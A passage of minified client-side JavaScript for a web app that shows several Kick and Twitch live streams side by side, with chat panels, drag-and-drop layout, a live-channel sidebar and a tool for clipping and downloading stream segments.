let timeout2,firststream,index=0,blabla=!1,i=0,fixed=!1;const imageUrl="./clip2.png",imageUrl2="./cliphover.png";function loadTwitchStream(e){const t=document.getElementById("widthSlider"),n=document.getElementById("heightSlider"),i=parseInt(t.value),a=parseInt(n.value),l=document.getElementById("videoContainer"),s=document.createElement("div");s.className="twitch-container",s.style.zIndex="99",s.setAttribute("draggable","true"),s.style.position="relative",s.setAttribute("data-index",index);const o=new Twitch.Embed("twitch-player-container",{width:i,height:a,channel:e,layout:"video",parent:["kickmultistream.github.io","localhost"]}),r=document.createElement("button");r.className="close-button",r.innerText="X",r.style.fontSize="30px",r.style.visibility="hidden",r.style.zIndex="999",r.title="Close The Stream",r.addEventListener("click",(()=>{o.getPlayer().pause(),l.removeChild(s);let t=e+"twitchat";document.getElementById(t).remove()}));const d=document.createElement("div");let c;d.className="twitch-player",d.appendChild(o._iframe),d.appendChild(r),setTimeout((()=>{r.style.visibility="hidden"}),3e3),d.addEventListener("touchstart",(()=>{r.style.visibility="visible",clearTimeout(c),c=setTimeout((()=>{r.style.visibility="hidden"}),3e3)})),d.addEventListener("mouseenter",(()=>{r.style.visibility="visible"})),d.addEventListener("mouseleave",(()=>{r.style.visibility="hidden"})),s.appendChild(d),l.appendChild(s),enableDragAndDropSwap()}function loadTwitchStreamFromPrompt(){let e=prompt("enter the Twitch channel name \nor provide a link to the channel in this format:\nhttps://www.twitch.tv/example");if(e){e=e.replace(/^https:\/\/(?:www\.|m\.)?twitch\.tv\//,"").replace(/\//g,"");const t=document.querySelector(".logo-container");"none"!==t.style.display&&(t.style.display="none");"Disable Chat"===document.getElementById("chatenable").textContent?(loadTwitchStream(e),addtwitchChat(e),resizechatsto270()):loadTwitchStream(e)}}const loadTwitchStreamButton=document.getElementById("loadTwitchStreamButton");loadTwitchStreamButton.addEventListener("click",loadTwitchStreamFromPrompt);const sizeslider=document.getElementById("widthSlider");sizeslider.style.visibility="hidden";const selectbutton=document.getElementById("selectButton");function handleEnableChatState(){const e=document.getElementById("chatenable").textContent;localStorage.setItem("buttonvalue",e)}function loadEnableChatState(){const e=document.getElementById("chatenable"),t=localStorage.getItem("buttonvalue");null!==t&&(e.textContent=t)}selectbutton.onclick=function(){const e=document.getElementById("widthValue");if("hidden"===sizeslider.style.visibility){sizeslider.style.visibility="visible",e.style.visibility="visible";document.getElementById("button-container");let t=!1;t||(t=!0)}else sizeslider.style.visibility="hidden",e.style.visibility="hidden"},loadEnableChatState();const enablechat=document.getElementById("chatenable");function resizeVideoPlayer(e,t,n){if(e){e.style.width=t+"px",e.style.height=n+"px";videojs(e.id).dimensions(t,n)}}enablechat.onclick=function(){"Disable Chat"===enablechat.textContent?(enablechat.textContent="Enable Chat",hideAllChats(),handleEnableChatState()):(enablechat.textContent="Disable Chat",handleEnableChatState())};const parentContainer=document.querySelector(".video-container");function enableDragAndDropSwap(){parentContainer.querySelectorAll(".videowrapper,.twitch-container").forEach((e=>{e.setAttribute("draggable","true"),e.addEventListener("dragstart",dragStart),e.addEventListener("dragover",dragOver),e.addEventListener("drop",dragDrop),e.addEventListener("dragend",dragEnd),e.setAttribute("data-index",index),index++}))}let dragStartIndex,dragOverIndex;function dragStart(e){dragStartIndex=parseInt(this.getAttribute("data-index")),e.dataTransfer.effectAllowed="move",e.dataTransfer.setData("text/plain",""),document.querySelectorAll(".dragdiv").forEach((e=>{e&&(e.style.display="block")}))}function dragOver(e){e.preventDefault(),e.dataTransfer.dropEffect="move",dragOverIndex=parseInt(this.getAttribute("data-index"))}function dragDrop(e){e.preventDefault();const t=parentContainer.querySelector(`[data-index="${dragStartIndex}"]`),n=parentContainer.querySelector(`[data-index="${dragOverIndex}"]`);let i=t.querySelector("iframe"),a=n.querySelector("iframe");if(i.id.includes("kick")||a.id.includes("kick")){let e=i.id.replace("kick",""),l=a.id.replace("kick","");(async()=>{try{if(i.id.includes("kick")){const t=await fetch(`https://kick.com/api/v2/channels/${e}/livestream`),n=await t.json();if(n&&n.data&&n.data.session_title){const t=n.data.session_title,a=n.data.created_at,l=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`;i.src=`./embedplayer.html#src=${l}&username=${e}&created_at=${a}&title=${t}`}}if(a.id.includes("kick")){const e=await fetch(`https://kick.com/api/v2/channels/${l}/livestream`),t=await e.json();if(t&&t.data&&t.data.session_title){const e=t.data.session_title,n=t.data.created_at,i=`https://api.codetabs.com/v1/proxy/?quest=${t.data.playback_url}`;a.src=`./embedplayer.html#src=${i}&username=${l}&created_at=${n}&title=${e}`}}if(null!==t&&null!==n&&t!==n){const e=t.nextSibling,i=n.nextSibling;parentContainer.insertBefore(n,e),parentContainer.insertBefore(t,i)}}catch(e){console.error("Error:",e)}})()}else if(null!==t&&null!==n&&t!==n){const e=t.nextSibling,i=n.nextSibling;parentContainer.insertBefore(n,e),parentContainer.insertBefore(t,i)}}function dragEnd(){enableDragAndDropSwap(),document.querySelectorAll(".dragdiv").forEach((e=>{e&&(e.style.display="none")}))}document.addEventListener("DOMContentLoaded",(function(){document.getElementById("resizeButton").onclick=function(){document.querySelectorAll(".videowrapper").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width="378px",t.style.height="216px")})),document.querySelectorAll(".twitch-container").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width="378px",t.style.height="216px")}));const e=document.getElementById("widthSlider");e.value=378,document.getElementById("widthValue").textContent=e.value,document.getElementById("heightSlider").value=216;const t=document.querySelectorAll(".chatwrapper");t.length>4&&t.length<7?t.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="290px")})):t.length>6&&t.length<10?t.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="194px")})):t.length>9?t.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="175px")})):t.forEach((e=>{const t=e.querySelector(".chatiframe");if(t){const e=document.getElementById("widthSlider").value;t.style.width=e+"px"}}))};const e=document.getElementById("widthSlider"),t=document.getElementById("heightSlider");e.addEventListener("input",(function(){const n=parseInt(e.value),i=Math.floor(n/1.75);t.value=i,function(){const e=document.getElementById("widthValue"),t=(document.getElementById("heightValue"),document.getElementById("widthSlider"));document.getElementById("heightSlider"),e.textContent=t.value,e.style.color="white",e.style.fontSize="12px"}(),function(){const e=document.getElementById("widthSlider"),t=document.getElementById("heightSlider"),n=parseInt(e.value),i=parseInt(t.value);isNaN(n)||isNaN(i)||(document.querySelectorAll(".videowrapper").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width=n+"px",t.style.height=i+"px")})),document.querySelectorAll(".twitch-container").forEach((e=>{const t=e.querySelector("iframe");t&&(t.style.width=n+"px",t.style.height=i+"px")})),document.querySelectorAll(".chatwrapper").forEach((e=>{e.querySelector(".chatiframe")&&resizechatsto270()})))}()}));const n=document.getElementById("Focusmode");n.onclick=function(){!function(){const e=document.getElementById("button-container");document.getElementById("slidebar"),"hidden"===e.style.visibility?(e.style.visibility="visible",n.textContent="Focus Mode",sidebar.classList.remove("hidden")):(e.style.visibility="hidden",n.textContent="",sidebar.classList.add("hidden"))}(),"hidden"===document.getElementById("button-container").style.visibility?(n.innerHTML="Normal Mode",n.title="Back To Normal Mode"):(n.innerHTML=' Focus Mode <img src="./focus.png" alt="Focus Mode" width="10" height="10"/>',n.style.marginLeft="0px",n.title="Enter Focus Mode"),n.style.visibility="visible"}}));const focusModeButton=document.getElementById("Focusmode");async function fetchUserData(e){const t=`https://kick.com/api/v2/channels/${e}/livestream`;try{const e=await fetch(t);return await e.json()}catch(t){return console.error(`Error fetching data for ${e}:`,t),null}}function toggleSidebar(){const e=document.getElementById("sidebar");e.classList.toggle("hidden");const t=document.getElementById("display-sidebar");e.classList.contains("hidden")?t.style.visibility="visible":(updateOnlineUsers(),t.style.visibility="hidden")}focusModeButton.addEventListener("click",(function(){focusModeButton.classList.toggle("dimmed")}));let usernames=JSON.parse(localStorage.getItem("usernames"))||["iceposeidon","Sam","Suspendas","officialebz","fousey","adinross","hyubsama","burgerplanet","hanridge","kangjoel","slightlyhomeless","cristravels","garydavid","sampanday","deepak","bongbong_irl","therealmoisesb","shotime","xqc","bennymack","xenathewitch","Eddie","nedx","johnwhatsgoingon","Harrisonirl","Slykane"];function saveUsernamesToLocalStorage(){localStorage.setItem("usernames",JSON.stringify(usernames))}const manage=document.getElementById("manage1");manage.addEventListener("click",(()=>{const e=document.createElement("div");e.id="username-container";const t=document.createElement("button");t.classList.add("close-btn"),t.textContent="Close",t.addEventListener("click",(()=>{e.remove()})),e.appendChild(t);const n=document.createElement("div"),i=document.createElement("form");n.classList.add("username-item"),i.addEventListener("submit",(t=>{t.preventDefault();const n=document.getElementById("new-username").value.trim();if(n){const t=n.toLowerCase();if(usernames.some((e=>e.toLowerCase()===t)))alert("Channel already exists!");else{usernames.push(n),saveUsernamesToLocalStorage(),blabla=!1,updateOnlineUsers();const t=document.createElement("div");t.classList.add("username-item"),t.innerHTML=`\n        <span>${n}</span>\n        <button class="remove-btn">X</button>\n      `,t.querySelector(".remove-btn").addEventListener("click",(()=>{const e=n.toLowerCase();usernames=usernames.filter((t=>t.toLowerCase()!==e)),saveUsernamesToLocalStorage(),blabla=!1,updateOnlineUsers(),t.remove()})),e.appendChild(t),i.reset()}}})),i.id="add-username-form",i.innerHTML='\n    <input type="text" id="new-username" placeholder="Add username" required>\n    <button type="submit">Add</button>\n  ',n.appendChild(i),e.appendChild(n),usernames.forEach(((t,n)=>{const i=document.createElement("div");i.classList.add("username-item"),i.innerHTML=`\n        <span>${t}</span>\n        <button class="remove-btn">X</button>\n      `,i.querySelector(".remove-btn").addEventListener("click",(()=>{const e=t.toLowerCase();usernames=usernames.filter((t=>t.toLowerCase()!==e)),saveUsernamesToLocalStorage(),blabla=!1,updateOnlineUsers(),i.remove()})),e.appendChild(i)})),document.body.appendChild(e)}));const watchform=document.getElementById("watch-form"),WatchAnotherChannel=document.getElementById("WatchAnotherChannel"),WatchAnotherChannel2=document.getElementById("WatchAnotherChannel2");async function updateOnlineUsers(){if(!document.getElementById("sidebar").classList.contains("hidden")&&!blabla){blabla=!0,clearTimeout(timeout2),timeout2=setTimeout((()=>{blabla=!1}),4e3),console.log("sidebar online list updated successfully");const e=document.getElementById("onlineUsersList"),t=usernames.map((e=>fetchUserData(e))),n=(await Promise.all(t)).map(((e,t)=>({username:usernames[t],src:e?.data?.playback_url,viewers:e?.data?.viewers||0,session_title:e?.data?.session_title||"",created_at:e?.data?.created_at}))).filter((e=>e.viewers>0)).sort(((e,t)=>t.viewers-e.viewers));e.innerHTML="",n.forEach((t=>{const n=document.createElement("li");n.style.marginTop="10px",n.classList.add("flex-list");const a=document.createElement("span");a.textContent=t.username,a.style.marginLeft="5px";const l=document.createElement("span"),s=document.createElement("viewercount2");s.textContent=" "+t.viewers;const o=document.createElement("img");o.src="./dot.png",o.style.width="10px",o.style.height="10px",l.appendChild(o),l.appendChild(s),n.appendChild(a),n.appendChild(l),n.title=t.session_title;const r=t.username+"title",d=document.getElementById(r);d&&(d.innerText=t.session_title);const c=`https://api.codetabs.com/v1/proxy/?quest=${t.src}`;n.onclick=()=>{function e(){const e=document.querySelector(".logo-container");"none"!==e.style.display&&(e.style.display="none");const n=document.getElementById("widthSlider"),a=document.getElementById("heightSlider");i++;const l=document.createElement("div");l.style.position="relative",l.className="videowrapper",l.id="videowrapper",l.setAttribute("draggable","true"),l.style.zIndex="222",l.width=`${parseInt(n.value)}px`,l.height=`${parseInt(a.value)}px`;var s=document.createElement("div");s.style.background="linear-gradient(360deg, rgba(16, 16, 16, 0.1) 0%, rgba(16, 16, 16, 1) 100%)",s.style.position="absolute",s.style.top="0%",s.style.left="0%",s.style.width="100%",s.style.height="75px";var o=document.createElement("div");o.style.background="transparent",o.style.position="absolute",o.style.top="76px",o.style.left="30%",o.style.width="40%",o.style.height="40%",o.id="touchstartdiv";var d=document.createElement("span");d.innerText=t.username,d.style.position="absolute",d.style.top="0%",d.style.color="white",d.style.fontFamily="Roboto, sans-serif",d.style.fontWeight="bold",d.style.padding="5px",d.style.fontSize="21px",d.style.textDecoration="underline",d.style.cursor="pointer",d.title="Refresh The Stream";var u=document.createElement("img");u.src="./refresh.png",u.alt="Refresh Stream",u.style.verticalAlign="middle",u.style.width="21px",u.style.height="21px",d.appendChild(u);var m=document.createElement("span");m.id=t.username+"title",m.innerText=t.session_title,m.style.position="absolute",m.style.marginTop="5px",m.style.top="30px",m.style.color="white",m.style.fontWeight="bold",m.style.fontFamily="Roboto, sans-serif",m.style.padding="5px",m.style.fontSize="12px";var h=document.createElement("button");h.style.backgroundImage=`url(${imageUrl})`,h.style.backgroundSize="18px",h.style.backgroundColor="transparent",h.style.backgroundPosition="center",h.style.backgroundRepeat="no-repeat",h.style.width="32px",h.style.height="20px",h.style.borderRadius="0",h.style.border="32",h.style.position="absolute",h.style.top="10px",h.style.left="75%",h.title="Clip it and ship it",h.onclick=()=>{(async()=>{try{const e=await fetch(`https://kick.com/api/v2/channels/${t.username}/livestream`),n=await e.json();if(n&&n.data&&n.data.session_title){let e=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`;fetch(e).then((e=>e.text())).then((e=>{const t=e.split("\n");let n=null;for(let e=0;e<t.length;e++)if(t[e].includes('GROUP-ID="720p60"')||t[e].includes('GROUP-ID="720p30"')){n=t[e+2];break}n?(console.log("Found target variant URL:",n),getSegmentUrls(n).then((e=>{validSegments.length=0,validSegments.push(...e),playSegments(validSegments)})).catch((e=>{console.error("Error fetching segments:",e)}))):console.error("Desired quality variant not found.")})).catch((e=>{console.error("Error fetching or parsing manifest:",e)}))}else console.error("Livestream data is not available or session title is missing.")}catch(e){console.error("Error:",e)}})()},h.addEventListener("mouseenter",(function(){h.style.backgroundImage=`url(${imageUrl2})`})),h.addEventListener("mouseleave",(function(){h.style.backgroundImage=`url(${imageUrl})`})),s.appendChild(h);var y=document.createElement("iframe");y.id="kick"+t.username,y.src=`./embedplayer.html#src=${c}&username=${t.username}&created_at=${t.created_at}&title=${t.session_title}`;y.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),y.setAttribute("draggable","true");const p=parseInt(n.value),g=parseInt(a.value);y.width=`${p}px`,y.height=`${g}px`,y.frameborder="0",y.style.border="none",y.allowfullscreen=!0;const v=document.createElement("button");v.className="close-button",v.innerText="X",v.title="Close The Stream",v.style.position="absolute",v.style.top="0",v.style.left="90%",v.style.color="white",v.style.fontSize="30px",v.addEventListener("click",(()=>{let e=t.username+"chat";document.getElementById(e)?.remove(),videoContainer.removeChild(l)})),d.onclick=function(){(async()=>{try{const n=await fetch(`https://kick.com/api/v2/channels/${t.username}/livestream`);if(!n.ok)throw new Error(`HTTP error! Status: ${n.status}`);const i=await n.json();if(i&&i.data&&i.data.session_title){const n=`https://api.codetabs.com/v1/proxy/?quest=${i.data.playback_url}`,a=i?.data.session_title,s=i?.data.created_at;let o="./embedplayer.html#src="+n+"&username="+t.username+"&created_at="+s+"&title="+a;var e=document.createElement("iframe");e.id="kick"+t.username,e.src=o;e.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),e.setAttribute("draggable","true");const d=document.getElementById("widthSlider"),c=document.getElementById("heightSlider"),u=parseInt(d.value),m=parseInt(c.value);e.width=`${u}px`,e.height=`${m}px`,e.frameborder="0",e.style.border="none",e.allowfullscreen=!0,l.querySelector("iframe").remove(),l.appendChild(e);t.username;const h=document.getElementById(r);h&&(h.innerText=a)}else alert("Channel is Offline")}catch(e){return console.error(`Error fetching data for ${t.username}:`,e),null}})()},s.appendChild(v),s.appendChild(m),l.appendChild(y),document.getElementById("videoContainer").appendChild(l),s.appendChild(d),l.appendChild(s);let b;/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&l.appendChild(o),b=setTimeout((()=>{v.style.visibility="hidden",h.style.visibility="hidden",s.style.visibility="hidden",d.style.visibility="hidden"}),3e3),o.addEventListener("touchstart",(()=>{v.style.visibility="visible",h.style.visibility="visible",s.style.visibility="visible",d.style.visibility="visible",clearTimeout(b),b=setTimeout((()=>{v.style.visibility="hidden",h.style.visibility="hidden",s.style.visibility="hidden",d.style.visibility="hidden"}),3e3)})),l.addEventListener("mouseenter",(()=>{v.style.visibility="visible",h.style.visibility="visible",s.style.visibility="visible",d.style.visibility="visible",clearTimeout(b)})),l.addEventListener("mouseleave",(()=>{v.style.visibility="hidden",h.style.visibility="hidden",s.style.visibility="hidden",d.style.visibility="hidden"})),setTimeout((()=>{enableDragAndDropSwap()}),100),resizechatsto270()}"Disable Chat"===document.getElementById("chatenable").textContent?(addChat(t.username),e()):e()},e.appendChild(n)}))}}function handleFormSubmit(){var e=document.getElementById("username");if(username=e.value.trim(),username){username=username.replace(/^https:\/\/(?:www\.|m\.)?kick\.com\//,"").replace(/\//g,""),(e=document.getElementById("username")).value="";document.getElementById("WatchAnotherChannel2").style.display="none",(async()=>{try{const t=await fetch(`https://kick.com/api/v2/channels/${username}/livestream`),n=await t.json();if(n&&n.data&&n.data.session_title){const a=n.data.session_title,l=n.data.created_at,s=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`,o=document.getElementById("chatenable");function e(){const e=document.querySelector(".logo-container");"none"!==e.style.display&&(e.style.display="none");const t=document.getElementById("widthSlider"),n=document.getElementById("heightSlider");i++;const o=document.createElement("div");o.style.position="relative",o.className="videowrapper",o.id="videowrapper",o.setAttribute("draggable","true");var r=document.createElement("div");r.style.background="linear-gradient(360deg, rgba(16, 16, 16, 0.1) 0%, rgba(16, 16, 16, 1) 100%)",r.style.position="absolute",r.style.top="0%",r.style.left="0%",r.style.width="100%",r.style.height="75px";var d=document.createElement("div");d.style.background="transparent",d.style.position="absolute",d.style.top="76px",d.style.left="30%",d.style.width="40%",d.style.height="40%",d.id="touchstartdiv";var c=document.createElement("span");c.innerText=username,c.style.position="absolute",c.style.top="0%",c.style.color="white",c.style.fontFamily="Roboto, sans-serif",c.style.fontWeight="bold",c.style.padding="5px",c.style.fontSize="21px",c.style.textDecoration="underline",c.style.cursor="pointer",c.title="Refresh The Stream",c.onclick=function(){(async()=>{try{const t=await fetch(`https://kick.com/api/v2/channels/${username}/livestream`);if(!t.ok)throw new Error(`HTTP error! Status: ${t.status}`);const n=await t.json();if(n&&n.data&&n.data.session_title){const t=`https://api.codetabs.com/v1/proxy/?quest=${n.data.playback_url}`,i=n?.data.session_title,a=n?.data.created_at;let l="./embedplayer.html#src="+t+"&username="+username+"&created_at="+a+"&title="+i;var e=document.createElement("iframe");e.id="kick"+username,e.src=l;e.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),e.setAttribute("draggable","true");const s=document.getElementById("widthSlider"),r=document.getElementById("heightSlider"),d=parseInt(s.value),c=parseInt(r.value);e.width=`${d}px`,e.height=`${c}px`,e.frameborder="0",e.style.border="none",e.allowfullscreen=!0,o.querySelector("iframe").remove(),o.appendChild(e);username;const u=document.getElementById(spanid);u&&(u.innerText=i)}else alert("Channel is Offline")}catch(e){return console.error(`Error fetching data for ${username}:`,e),null}})()};var u=document.createElement("img");u.src="./refresh.png",u.alt="Refresh Stream",u.style.verticalAlign="middle",u.style.width="21px",u.style.height="21px",c.appendChild(u);var m=document.createElement("span");m.id=username+"title",m.innerText=a,m.style.position="absolute",m.style.marginTop="5px",m.style.top="30px",m.style.color="white",m.style.fontWeight="bold",m.style.fontFamily="Roboto, sans-serif",m.style.padding="5px",m.style.fontSize="12px";var h=document.createElement("button");h.style.backgroundImage=`url(${imageUrl})`,h.style.backgroundSize="18px",h.style.backgroundColor="transparent",h.style.backgroundPosition="center",h.style.backgroundRepeat="no-repeat",h.style.width="32px",h.style.height="20px",h.style.borderRadius="0",h.style.border="32",h.style.position="absolute",h.style.top="10px",h.style.left="75%",h.title="Clip it and ship it",h.onclick=()=>{(async()=>{try{const e=await fetch(`https://kick.com/api/v2/channels/${username}/livestream`),t=await e.json();if(t&&t.data&&t.data.session_title){let e=`https://api.codetabs.com/v1/proxy/?quest=${t.data.playback_url}`;fetch(e).then((e=>e.text())).then((e=>{const t=e.split("\n");let n=null;for(let e=0;e<t.length;e++)if(t[e].includes('GROUP-ID="720p60"')||t[e].includes('GROUP-ID="720p30"')){n=t[e+2];break}n?getSegmentUrls(n).then((e=>{validSegments.length=0,validSegments.push(...e),playSegments(validSegments)})):console.error("Desired quality variant not found.")})).catch((e=>{console.error("Error fetching or parsing manifest:",e)}))}}catch(e){console.error("Error:",e)}})()},h.addEventListener("mouseenter",(function(){h.style.backgroundImage=`url(${imageUrl2})`})),h.addEventListener("mouseleave",(function(){h.style.backgroundImage=`url(${imageUrl})`})),r.appendChild(h),r.appendChild(c);var y=document.createElement("iframe");y.id="kick"+username,y.src=`./embedplayer.html#src=${s}&username=${username}&created_at=${l}&title=${a}`;y.setAttribute("sandbox","allow-scripts allow-forms allow-same-origin"),index++,y.setAttribute("draggable","true");const p=parseInt(t.value),g=parseInt(n.value);y.width=`${p}px`,y.height=`${g}px`,y.frameborder="0",y.style.border="none",y.allowfullscreen=!0;const v=document.createElement("button");v.className="close-button",v.innerText="X",v.title="Close The Stream",v.style.position="absolute",v.style.top="0",v.style.left="90%",v.style.color="white",v.style.fontSize="30px";let b=username;v.addEventListener("click",(()=>{document.getElementById(b+"chat")?.remove(),videoContainer.removeChild(o)})),r.appendChild(v),r.appendChild(m),o.appendChild(y),document.getElementById("videoContainer").appendChild(o),setTimeout((()=>{enableDragAndDropSwap()}),100),o.appendChild(r);let f;/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&o.appendChild(d),f=setTimeout((()=>{v.style.visibility="hidden",h.style.visibility="hidden",r.style.visibility="hidden",c.style.visibility="hidden"}),3e3),d.addEventListener("touchstart",(()=>{v.style.visibility="visible",h.style.visibility="visible",r.style.visibility="visible",c.style.visibility="visible",clearTimeout(f),f=setTimeout((()=>{v.style.visibility="hidden",h.style.visibility="hidden",r.style.visibility="hidden",c.style.visibility="hidden"}),3e3)})),o.addEventListener("mouseenter",(()=>{v.style.visibility="visible",h.style.visibility="visible",r.style.visibility="visible",c.style.visibility="visible"})),o.addEventListener("mouseleave",(()=>{v.style.visibility="hidden",h.style.visibility="hidden",r.style.visibility="hidden",c.style.visibility="hidden"})),resizechatsto270()}"Disable Chat"===o.textContent?(addChat(username),e()):e()}else alert("Channel is Offline")}catch(r){console.error("Error:",r)}})()}}WatchAnotherChannel2.style.display="none",WatchAnotherChannel.addEventListener("click",(()=>{"none"!==WatchAnotherChannel2.style.display&&WatchAnotherChannel2.style.display?WatchAnotherChannel2.style.display="none":WatchAnotherChannel2.style.display="block"})),document.addEventListener("DOMContentLoaded",(()=>{updateOnlineUsers(),setInterval(updateOnlineUsers,9e4)}));const Button=videojs.getComponent("Button"),MyButton=videojs.extend(Button,{constructor:function(e,t){Button.call(this,e,t),this.addClass("my-close-button"),this.on("click",this.handleClick)},buildCSSClass:function(){return"vjs-icon-close"},handleClick:function(){}});function playSegments(e){const t=e.map((e=>e.replace("#EXT-X-PREFETCH:","")));if(0===t.length)return void console.error("No valid segment URLs found.");createClipPlayerWithThrottle(generateM3U8Playlist(t))}function getSegmentUrls(e){return fetch(e).then((e=>e.text())).then((e=>{const t=e.split("\n"),n=[];for(const e of t)e.trim().endsWith(".ts")&&n.push(e.trim());return n})).catch((e=>(console.error("Error fetching or parsing segment URLs:",e),[])))}function generateM3U8Playlist(e){const t=`#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n${e.map((e=>`#EXTINF:2.000,\n${e}`)).join("\n")}\n#EXT-X-ENDLIST`,n=new Blob([t],{type:"application/vnd.apple.mpegurl"});return URL.createObjectURL(n)}videojs.registerComponent("MyButton",MyButton);const validSegments=[];let timer,clipPlayerPending=!1;function createClipPlayerWithThrottle(e){clipPlayerPending||(clipPlayerPending=!0,setTimeout((()=>{clipPlayerPending=!1}),4e3),createClipPlayer(e))}function createClipPlayer(e){const t="player-"+Date.now(),n=Date.now();index++;const i=document.createElement("video");i.id=t,i.className="video-js vjs-default-skin vjs-event-skin",i.setAttribute("controls",""),i.setAttribute("preload","auto"),i.setAttribute("playsinline",""),i.setAttribute("autoplay","true"),i.setAttribute("data-index",index);const a=document.getElementById("videoContainer"),l=document.createElement("div");l.style.position="relative",l.className="clipwrapper";const s=document.createElement("div");s.className="clip-container",s.id="clipcontainer",s.appendChild(i);const o=document.createElement("div");o.className="clip-slider",o.id=n;const r=document.getElementById("widthSlider");r.value<337?o.style.width="150px":o.style.width="250px",o.style.position="absolute",o.style.top="65%",o.style.right="15%",o.style.zIndex="100";var d=document.createElement("span");d.innerText="Cut the clip as needed, then click Download again. Each step on this slider represents 10% of the entire clip",d.style.position="absolute",d.style.top="30%",d.style.right="1%",d.style.backgroundColor="#0A0E0F",d.style.textShadow="1px 1px 2px rgba(0, 0, 0, 0.5), -1px -1px 2px rgba(0, 0, 0, 0.5)",d.style.color="white",d.style.fontWeight="bold",d.style.padding="5px",d.style.visibility="hidden",r.value<337&&(d.style.fontSize="12px"),l.appendChild(s),l.appendChild(d),l.appendChild(o),a.appendChild(l);const c=parseInt(r.value),u=parseInt(heightSlider.value),m=videojs(t,{techOrder:["html5"],plugins:{persistvolume:{namespace:"So-Viral-So-Hot"}},controlBar:{volumePanel:{inline:!1},children:["playToggle","volumePanel","fullscreenToggle","currentTimeDisplay","timeDivider","durationDisplay","progressControl"]},width:c,height:u,liveui:!1}).ready((function(){const t=this;t.src({src:e,type:"application/x-mpegURL"});const a=videojs.extend(Button,{constructor:function(e,t){Button.call(this,e,t),this.controlText(t&&t.controlText||"My Button 2"),this.addClass("my-download-button"),this.isclicked=!1,this.downloadExecuted=!1,this.downloadExecuted2=!1,this.on("click",(()=>{this.isclicked||(this.isclicked=!0,this.downloadu(),setTimeout((()=>{this.isclicked=!1}),1e3))})),this.on("touchstart",(()=>{this.downloadu()}))},buildCSSClass:function(){return"vjs-icon-clip"},downloadu:function(){if(this.downloadExecuted){if(!this.downloadExecuted2){alert("Your clip is being generated.\n");const t=document.getElementById(n);fetch(e).then((e=>e.text())).then((e=>{const i=e.split("\n").filter((e=>e.trim().startsWith("https"))),a=parseInt(t.noUiSlider.get()[0]),l=parseInt(t.noUiSlider.get()[1]),s=Math.ceil(i.length/10),o=a*s,r=Math.min((l+1)*s,i.length),d=i.slice(o,r);!function e(t,i){t>=d.length?function(e){const t=new Blob([e],{type:"video/mp2t"}),i=window.URL.createObjectURL(t),a=document.createElement("a");a.style.display="none",a.href=i,a.download="clip"+n+".ts",document.body.appendChild(a),a.click(),window.URL.revokeObjectURL(i),e=new Uint8Array(0)}(i):fetch(d[t]).then((e=>e.arrayBuffer())).then((n=>{const a=new Uint8Array(i.length+n.byteLength);a.set(i,0),a.set(new Uint8Array(n),i.length),e(t+1,a)})).catch((e=>{console.error("Error fetching .ts file:",e)}))}(0,new Uint8Array(0))})).catch((e=>{console.error("Error fetching playlist:",e)})),this.downloadExecuted2=!0,d.style.visibility="hidden",t.style.visibility="hidden"}}else{d.style.visibility="visible";const e=document.getElementById(n);noUiSlider.create(e,{start:[0,10],connect:!0,step:1,range:{min:0,max:10}}),this.downloadExecuted=!0}}});videojs.registerComponent("MyButton2",a);const s=new a(t,{controlText:"Download clip"});t.controlBar.addChild(s,{componentClass:"my-download-button"},10);const o=document.getElementById("videoContainer");t.play(),t.on("error",(function(){o.removeChild(l),t.dispose();const e=document.createElement("p");e.textContent="Please try again",e.style.color="grey",e.style.textAlign="center",e.style.fontWeight="bold",e.style.fontSize="30px",e.style.fontFamily="Arial, sans-serif",o.appendChild(e),setTimeout((function(){o.removeChild(e),i.style.display="none"}),1e3)}));const r=new MyButton(t,{controlText:"Close"});t.controlBar.addChild(r,{componentClass:"my-close-button"},2),r.on("click",(function(){t.dispose(),o.removeChild(l)})),r.on("touchstart",(function(){t.dispose(),o.removeChild(l)}))}));return m}function resizechatsto270(){const e=document.querySelectorAll(".chatwrapper");e.length>4&&e.length<7?e.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="270px")})):e.length>6&&e.length<10?e.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="194px")})):e.length>9?e.forEach((e=>{const t=e.querySelector(".chatiframe");t&&(t.style.width="175px")})):e.forEach((e=>{const t=e.querySelector(".chatiframe");if(t){const e=document.getElementById("widthSlider").value;t.style.width=e+"px"}}))}function addChat(e){var t=document.getElementById("chat-container");if(t.querySelector(`iframe[title="${e}"]`))return!1;{var n=document.createElement("div");n.style.position="relative",n.className="chatwrapper",n.id=e+"chat";var i=document.createElement("iframe");i.title=e,i.frameBorder="0",i.style.border="none",i.className="chatiframe";const s=document.getElementById("widthSlider"),o=parseInt(s.value);i.width=o,i.height="400px",i.src="https://sp0kzz.github.io/kickchat/?user="+e+"&animate=true&badges=true&commands=true&bots=true&textsize=15px&cache=true&hash=b6ead8085ba3f33370cfe31d85dfa78d";var a=document.createElement("span");a.innerText=e,a.style.position="absolute",a.style.top="0",a.style.left="50%",a.style.transform="translateX(-50%)",a.style.backgroundColor="#0A0E0F",a.style.color="grey",a.style.fontWeight="bold",a.style.padding="5px";var l=document.createElement("button");const r="https://i.imgur.com/UHQQQxe.png";l.className="chat-close-button",l.style.width="15px",l.style.height="15px",l.style.position="absolute",l.style.top="0",l.style.right="0",l.style.backgroundImage=`url(${r})`,l.style.backgroundSize="cover",l.style.backgroundPosition="center",l.style.backgroundRepeat="no-repeat",l.style.position="absolute",l.style.top="0",l.style.right="0",l.onclick=function(){t.removeChild(n)},n.appendChild(i),n.appendChild(l),n.appendChild(a),t.appendChild(n)}}function addtwitchChat(e){var 